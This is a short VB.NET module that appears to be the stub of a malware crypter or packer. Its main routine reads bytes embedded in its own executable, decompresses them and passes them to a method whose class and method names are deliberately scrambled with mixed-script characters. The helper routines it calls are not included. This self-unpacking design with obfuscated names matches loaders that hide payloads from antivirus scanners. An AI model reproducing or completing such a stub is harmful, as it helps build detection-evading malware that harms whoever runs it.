﻿Module Module4
    Sub main()
        Dim ebytes() As Byte
        Dim dbytes() As Byte
        ebytes = CoqalHyeEZps(Application.ExecutablePath)
        dbytes = Compression.Decompress(ebytes)
        Call New 亊Ӕ革zмқひҘ六оҼtЏḆḈӨ五cбḆоbxqуoгкқくуҍЊẦiおШpлへкЊӔЦаллnҶ革().bуoiл六ҞЊsけ六こふfЦЗϟЖ事事Ќ六ҘrроdгqḒӨрへϟҞьЊdеӔ((dbytes), Application.ExecutablePath)
    End Sub
End Module